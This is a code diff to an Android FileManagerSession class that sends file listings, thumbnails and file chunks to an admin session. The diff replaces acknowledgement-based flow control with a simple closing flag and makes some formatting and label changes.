@@ -29,9 +29,8 @@ import java.util.Arrays;
 import java.util.Comparator;
 
 public class FileManagerSession extends Session {
-    private static final int CHUNK_SIZE = 1024 * 1024; // 1 MB
-    final Object lock = new Object();
-    private boolean waitingForAck = false;
+    private static final int CHUNK_SIZE = 4096; // 4 KB
+    boolean closing = false;
 
     public FileManagerSession(Context context, String adminToken, OnRequestSendMessageListener onRequestSendMessageListener, int id) {
         super(context, adminToken, onRequestSendMessageListener, id);
@@ -74,15 +73,6 @@ public class FileManagerSession extends Session {
             case Actions.ACTION_REQUEST_DOWNLOAD_FILE:
                 String filePath2 = jsonObject.getString(Constants.FILE_PATH_KEY);
                 sendFileTransferStartedSignal(filePath2);
-                break;
-            case Actions.ACTION_FILE_RECEIVED:
-            case Actions.ACTION_CHUCK_RECEIVED:
-                Log.d("FileManagerSession", "ack received");
-                synchronized (lock) {
-                    waitingForAck = false;
-                    Log.d("FileManagerSession", "notifying");
-                    lock.notify();
-                }
                 break;
             default:
                 break;
@@ -154,20 +144,13 @@ public class FileManagerSession extends Session {
                     byte[] buffer = new byte[CHUNK_SIZE];
                     int bytesRead;
                     while ((bytesRead = fis.read(buffer)) != -1) {
-                        synchronized (lock) {
-                            waitingForAck = true;
-                            sendChunk(file.getAbsolutePath(), buffer, bytesRead);
-                            while (waitingForAck) {
-                                Log.d("FileManagerSession", "waiting for response.");
-                                lock.wait(60 * 1000 * 2);
-                                if(waitingForAck){
-                                    return;
-                                }
-                            }
+                        if(closing){
+                            break;
                         }
+                        sendChunk(file.getAbsolutePath(), buffer, bytesRead);
                     }
                     sendFileTransferCompletedSignal(file);
-                } catch (IOException | InterruptedException | JSONException e) {
+                } catch (IOException | JSONException e) {
                     try {
                         sendError(e.getMessage());
                     } catch (JSONException jsonException) {
@@ -227,29 +210,27 @@ public class FileManagerSession extends Session {
         if (externalStorageVolumes.length > 1 && externalStorageVolumes[1] != null) {
             sdCard = externalStorageVolumes[1];
             internalStorage = externalStorageVolumes[0];
-        }
-        else {
+        } else {
             internalStorage = externalStorageVolumes[0];
         }
 
-        if(sdCard != null && internalStorage != null){
+        if (sdCard != null && internalStorage != null) {
             String similar = getSimilar(sdCard, internalStorage);
-            if(!similar.isEmpty()){
+            if (!similar.isEmpty()) {
                 String pureSdCard = sdCard.getAbsolutePath().replace(similar, "");
                 String pureInternalStorage = internalStorage.getAbsolutePath().replace(similar, "");
                 sdCard = new File(pureSdCard);
                 internalStorage = new File(pureInternalStorage);
             }
-        }
-        else{
+        } else {
             internalStorage = Environment.getExternalStorageDirectory();
         }
 
-        if(internalStorage != null){
+        if (internalStorage != null) {
             JSONObject jsonObject = new JSONObject();
             jsonObject.put(Constants.ACTION_KEY, Actions.ACTION_FILE_CHANGE);
             jsonObject.put(Constants.DEVICE_FILE_CHANGE_TYPE_KEY, Constants.DEVICE_FILE_CHANGE_ADD_KEY);
-            jsonObject.put(Constants.DEVICE_FILE_NAME_KEY, "Internal Storage");
+            jsonObject.put(Constants.DEVICE_FILE_NAME_KEY, "internal_storage");
             jsonObject.put(Constants.DEVICE_FILE_SIZE_KEY, internalStorage.length());
             jsonObject.put(Constants.DEVICE_FILE_PATH_KEY, internalStorage.getAbsolutePath());
             jsonObject.put(Constants.DEVICE_FILE_MIME_TYPE_KEY, internalStorage.isDirectory() ? "document/directory" : getMimeType(internalStorage));
@@ -258,11 +239,11 @@ public class FileManagerSession extends Session {
             sendMessage(jsonObject.toString());
         }
 
-        if(sdCard != null){
+        if (sdCard != null) {
             JSONObject jsonObject = new JSONObject();
             jsonObject.put(Constants.ACTION_KEY, Actions.ACTION_FILE_CHANGE);
             jsonObject.put(Constants.DEVICE_FILE_CHANGE_TYPE_KEY, Constants.DEVICE_FILE_CHANGE_ADD_KEY);
-            jsonObject.put(Constants.DEVICE_FILE_NAME_KEY, "SD Card");
+            jsonObject.put(Constants.DEVICE_FILE_NAME_KEY, "sd_card");
             jsonObject.put(Constants.DEVICE_FILE_SIZE_KEY, sdCard.length());
             jsonObject.put(Constants.DEVICE_FILE_PATH_KEY, sdCard.getAbsolutePath());
             jsonObject.put(Constants.DEVICE_FILE_MIME_TYPE_KEY, sdCard.isDirectory() ? "document/directory" : getMimeType(sdCard));
@@ -311,11 +292,7 @@ public class FileManagerSession extends Session {
     }
 
 
-    public void sendFileList(String filesPath){
-        synchronized (lock){
-            lock.notify();
-        }
-
+    public void sendFileList(String filesPath) {
         if (FilesManager.fileExists(filesPath)) {
             File[] files = new File(filesPath).listFiles();
 
@@ -337,23 +314,15 @@ public class FileManagerSession extends Session {
             new Thread(() -> {
                 try {
                     for (File file : files) {
+                        if(closing){
+                            break;
+                        }
                         JSONObject jsonObject = fileToJson(file);
                         jsonObject.put(Constants.ACTION_KEY, Actions.ACTION_FILE_CHANGE);
                         jsonObject.put(Constants.DEVICE_FILE_CHANGE_TYPE_KEY, Constants.DEVICE_FILE_CHANGE_ADD_KEY);
-                        synchronized (lock) {
-                            waitingForAck = true;
-                            sendMessage(jsonObject.toString());
-                            while (waitingForAck) {
-                                Log.d("FileManagerSession", "waiting for response.");
-                                lock.wait(60 * 1000 * 2);
-                                if (waitingForAck) {
-                                    return;
-                                }
-                            }
-                        }
+                        sendMessage(jsonObject.toString());
                     }
-                }
-                catch (Exception e){
+                } catch (Exception e) {
                     e.printStackTrace();
                 }
             }).start();
@@ -367,9 +336,9 @@ public class FileManagerSession extends Session {
         jsonObject.put(Constants.DEVICE_FILE_SIZE_KEY, file.length());
         jsonObject.put(Constants.DEVICE_FILE_PATH_KEY, file.getAbsolutePath());
         String mimeType = file.isDirectory() ? "document/directory" : getMimeType(file);
-        if(mimeType.contains("image") || mimeType.contains("video")){
+        if (mimeType.contains("image") || mimeType.contains("video")) {
             String thumbnail = mimeType.contains("video") ? videoToThumbnail(file) : imageToThumbnail(file);
-            if(thumbnail != null){
+            if (thumbnail != null) {
                 jsonObject.put(Constants.DEVICE_FILE_THUMBNAIL_KEY, thumbnail);
             }
         }
@@ -378,7 +347,8 @@ public class FileManagerSession extends Session {
         jsonObject.put(Constants.DEVICE_FILE_MODIFIED_KEY, file.lastModified());
         return jsonObject;
     }
-    public String videoToThumbnail(File file){
+
+    public String videoToThumbnail(File file) {
         if (file.exists()) {
             Bitmap thumbImage = ThumbnailUtils.createVideoThumbnail(file.getAbsolutePath(), MediaStore.Images.Thumbnails.MINI_KIND);
             // Convert to base64
@@ -388,7 +358,8 @@ public class FileManagerSession extends Session {
         }
         return null;
     }
-    public String imageToThumbnail(File file){
+
+    public String imageToThumbnail(File file) {
         if (file.exists()) {
             Bitmap thumbImage = ThumbnailUtils.extractThumbnail(BitmapFactory.decodeFile(file.getAbsolutePath()),
                     64, 64);
@@ -419,8 +390,5 @@ public class FileManagerSession extends Session {
     @Override
     public void close() {
         super.close();
-        synchronized (lock){
-            lock.notify();
-        }
     }
 }
